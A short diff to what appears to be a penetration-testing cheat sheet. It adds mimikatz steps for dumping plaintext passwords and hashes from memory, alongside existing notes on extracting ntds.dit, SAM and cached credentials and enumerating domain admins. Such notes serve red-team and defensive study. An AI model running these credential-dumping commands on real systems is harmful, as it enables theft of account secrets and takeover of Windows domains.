@@ -26,6 +26,9 @@ Post-Exploitation
 If have DC access, use CrackMapExe module to extract ntds.dit (contains AD data) and other modules.  
 
 * [mimikatz](https://github.com/gentilkiwi/mimikatz) - extract plaintext passwords, hashes, PIN codes, kerberos tickets from memory; pass-the-hash. Useful commands:  
+
+`privilege::debug`  
+`sekurlsa::LogonPasswords full`  
 `!lsadum::cache` - dump cached credentials  
 `!lsadump:sam` - dump local user account password hashes  
 `misc::cmd` - re-enable command shell, if disabled in registry  
@@ -48,6 +51,12 @@ nltest /server:[address] /domain_trusts` - map domain trusts
 `net group "enterprise admins" /DOMAIN` - show ent admins  
 `net group "domain admins" /DOMAIN` - show domain admins  
 `net localgroup "administrators" /DOMAIN` - show local admins  
+
+Mimikatz:
+
+1) Run as admin
+2) `privilege::debug`
+3) `sekurlsa::LogonPasswords full`
 
 Null Session
 ------------
